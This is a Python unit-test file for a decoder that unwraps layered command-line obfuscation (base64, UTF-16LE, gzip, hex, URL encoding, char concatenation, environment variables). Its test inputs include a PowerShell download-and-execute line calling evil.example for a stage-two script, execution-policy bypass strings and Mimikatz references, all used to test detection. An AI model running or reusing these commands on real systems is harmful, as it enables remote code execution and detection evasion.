"""Unit tests for the multi-encoding decode pipeline.

Each test uses a real adversarial payload representative of the encoding
technique. Sources noted inline.
"""

from __future__ import annotations

import base64
import gzip

import pytest

from app.decoder import decode_layers


# ── Helpers ──────────────────────────────────────────────────────────────────

def _encodings(layers) -> list[str]:
    return [l["encoding"] for l in layers]


def _values(layers) -> list[str]:
    return [l["value"] for l in layers]


# ── Base64 / UTF-16LE / gzip (existing capabilities, regression guard) ────────

_LONG_PAYLOAD = b"Invoke-Expression(New-Object Net.WebClient).DownloadString('http://evil.example/stage2.ps1')"


def test_base64_plain():
    b64 = base64.b64encode(_LONG_PAYLOAD).decode()
    layers = decode_layers(f"powershell -enc {b64}")
    assert any("base64" in e for e in _encodings(layers))
    assert any("Invoke-Expression" in v for v in _values(layers))


def test_utf16le_jab_prefix():
    payload = base64.b64encode(_LONG_PAYLOAD.decode().encode("utf-16-le")).decode()
    layers = decode_layers(f"powershell -EncodedCommand {payload}")
    assert any("utf16le" in e for e in _encodings(layers))
    assert any("Invoke-Expression" in v for v in _values(layers))


def test_gzip_h4si_prefix():
    gz = gzip.compress(_LONG_PAYLOAD, mtime=0)
    payload = base64.b64encode(gz).decode()
    layers = decode_layers(f'$b=[Convert]::FromBase64String("{payload}");iex $b')
    assert any("gzip" in e for e in _encodings(layers))
    assert any(b"Invoke-Expression" in v.encode("latin-1", "replace") for v in _values(layers))


def test_limit_reached_verdict():
    """Five nested base64 layers should trigger the limit-reached sentinel."""
    text = _LONG_PAYLOAD.decode()
    for _ in range(6):
        text = "powershell -enc " + base64.b64encode(text.encode()).decode()
    layers = decode_layers(text)
    assert any(l["encoding"] == "limit-reached" for l in layers)


# ── Hex escape ────────────────────────────────────────────────────────────────

def test_hex_escape_whoami():
    # Source: common AMSI bypass patterns using \xNN notation
    cmd = r'powershell "$s = \"\x77\x68\x6f\x61\x6d\x69\""'
    layers = decode_layers(cmd)
    assert any(l["encoding"] == "hex-escape" for l in layers)
    assert any("whoami" in l["value"] for l in layers if l["encoding"] == "hex-escape")


def test_hex_escape_powershell():
    cmd = r'\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c \x2d\x65\x70 \x62\x79\x70\x61\x73\x73'
    layers = decode_layers(cmd)
    assert any(l["encoding"] == "hex-escape" for l in layers)


# ── Pure hex string ───────────────────────────────────────────────────────────

def test_hex_string_decode():
    # 'powershell -enc' as hex
    payload = "706f7765727368656c6c202d656e63"
    layers = decode_layers(f"certutil -decodehex {payload} out.ps1")
    assert any(l["encoding"] == "hex-string" for l in layers)
    assert any("powershell" in l["value"] for l in layers if l["encoding"] == "hex-string")


def test_hex_string_minimum_length():
    # Too short hex — should NOT decode
    layers = decode_layers("certutil -decode 414243 out")
    hex_layers = [l for l in layers if l["encoding"] == "hex-string"]
    assert len(hex_layers) == 0


# ── URL encoding ──────────────────────────────────────────────────────────────

def test_url_decode_powershell():
    # Source: ClickFix payloads using %XX encoding to evade copy-paste detection
    cmd = "cmd.exe /c %70%6f%77%65%72%73%68%65%6c%6c%20%2d%65%70%20%62%79%70%61%73%73"
    layers = decode_layers(cmd)
    assert any(l["encoding"] == "url-encoded" for l in layers)
    assert any("powershell" in l["value"] for l in layers if l["encoding"] == "url-encoded")


def test_url_decode_too_few_changes():
    # Fewer than 3 distinct char positions changed — should not trigger
    cmd = "cmd%2Fwhoami"  # only one %XX sequence → 1 char change — below threshold
    layers = decode_layers(cmd)
    url_layers = [l for l in layers if l["encoding"] == "url-encoded"]
    assert len(url_layers) == 0


# ── [char] concatenation ─────────────────────────────────────────────────────

def test_char_concat_hex():
    # Source: common AMSI bypass using char concat to avoid string detection
    cmd = "[char]0x77+[char]0x68+[char]0x6f+[char]0x61+[char]0x6d+[char]0x69"
    layers = decode_layers(cmd)
    assert any(l["encoding"] == "char-concat" for l in layers)
    assert any("whoami" in l["value"] for l in layers if l["encoding"] == "char-concat")


def test_char_concat_decimal():
    cmd = "[char]99+[char]109+[char]100"
    layers = decode_layers(cmd)
    assert any(l["encoding"] == "char-concat" for l in layers)
    assert any("cmd" in l["value"] for l in layers if l["encoding"] == "char-concat")


def test_char_concat_too_short():
    # Only 2 chars — below minimum threshold
    cmd = "[char]0x41+[char]0x42"
    layers = decode_layers(cmd)
    assert not any(l["encoding"] == "char-concat" for l in layers)


# ── $env: variable substitution ──────────────────────────────────────────────

def test_env_comspec_resolved():
    cmd = r"$env:ComSpec /c whoami"
    layers = decode_layers(cmd)
    assert any(l["encoding"] == "env-variable-substitution" for l in layers)
    assert any("cmd.exe" in l["value"] for l in layers if l["encoding"] == "env-variable-substitution")


def test_env_systemroot_resolved():
    cmd = r"$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe -enc"
    layers = decode_layers(cmd)
    assert any(l["encoding"] == "env-variable-substitution" for l in layers)


def test_env_no_match_unchanged():
    # No known $env: vars — should produce no layer
    cmd = "whoami /all"
    layers = decode_layers(cmd)
    assert not any(l["encoding"] == "env-variable-substitution" for l in layers)


# ── FromBase64String explicit pattern ─────────────────────────────────────────

def test_frombase64string_quoted_single():
    payload = base64.b64encode(b"Invoke-Mimikatz").decode()
    cmd = f"[System.Convert]::FromBase64String('{payload}')"
    layers = decode_layers(cmd)
    assert len(layers) >= 1
    assert any("Invoke-Mimikatz" in v for v in _values(layers))


def test_frombase64string_quoted_double():
    payload = base64.b64encode(b"Get-Credential -Username admin -Password secret").decode()
    cmd = f'[Convert]::FromBase64String("{payload}")'
    layers = decode_layers(cmd)
    assert any("Get-Credential" in v for v in _values(layers))
